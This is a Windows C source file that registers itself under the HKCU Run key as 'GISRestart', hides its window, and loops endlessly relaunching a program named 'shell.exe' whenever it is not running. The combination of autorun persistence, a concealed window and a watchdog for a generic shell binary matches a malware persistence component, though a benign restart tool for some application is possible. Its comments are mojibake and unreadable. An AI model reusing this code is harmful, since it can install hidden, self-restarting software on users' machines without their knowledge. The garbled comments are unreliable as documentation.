#include <windows.h>
//���õ�ǰ���򿪻�����
#include <tchar.h>
#include <tlhelp32.h>    //���̿��պ���ͷ�ļ�
#include <stdio.h>

void AutoPowerOn() {
	HKEY hKey;
	//std::string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//1���ҵ�ϵͳ��������
	if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS,
	                 &hKey) == ERROR_SUCCESS) { ///��������
		//2���õ������������ȫ·��
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3���ж�ע������Ƿ��Ѿ�����
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, NULL, _T("GISRestart"), RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4���Ѿ�����
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0) {
			//5�����һ����Key,������ֵ��"GISRestart"��Ӧ�ó������֣����Ӻ�׺.exe��
			RegSetValueEx(hKey, _T("GISRestart"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));
			//6���ر�ע���
			RegCloseKey(hKey);
		}
	}
}


//ȡ����ǰ���򿪻�����
void CanclePowerOn() {
	HKEY hKey;
	//std::string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//1���ҵ�ϵͳ��������
	if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS,
	                 &hKey) == ERROR_SUCCESS) {
		//2��ɾ��ֵ
		RegDeleteValue(hKey, _T("GISRestart"));
		//3���ر�ע���
		RegCloseKey(hKey);
	}
}

void HideWindow() {
	HWND hwnd = GetForegroundWindow();
	if (hwnd) {
		ShowWindow(hwnd, SW_HIDE);
	}
}

bool getProcess(const char *procressName) {              //�˺��������������ִ�Сд
	char pName[MAX_PATH];                                //��PROCESSENTRY32�ṹ���е�szExeFile�ַ����鱣��һ�£����ڱȽ�
	strcpy(pName, procressName);                           //��������
	CharLowerBuff(pName, MAX_PATH);                       //������ת��ΪСд
	PROCESSENTRY32 currentProcess;                        //��ſ��ս�����Ϣ��һ���ṹ��
	currentProcess.dwSize = sizeof(currentProcess);        //��ʹ������ṹ֮ǰ�����������Ĵ�С
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //��ϵͳ�ڵ����н�����һ������
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot()����ʧ��!\n");
		return false;
	}
	bool bMore = Process32First(hProcess, &currentProcess);     //��ȡ��һ��������Ϣ
	while (bMore) {
		CharLowerBuff(currentProcess.szExeFile, MAX_PATH);       //��������ת��ΪСд
		if (strcmp(currentProcess.szExeFile, pName) == 0) {       //�Ƚ��Ƿ���ڴ˽���
			CloseHandle(hProcess);                                //���hProcess���
			return true;
		}
		bMore = Process32Next(hProcess, &currentProcess);         //������һ��
	}
	CloseHandle(hProcess);    //���hProcess���
	return false;
}

int main() {
	AutoPowerOn();
	HideWindow();
	while (1) {
		if (!getProcess("shell.exe")) {
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
		}
	}
}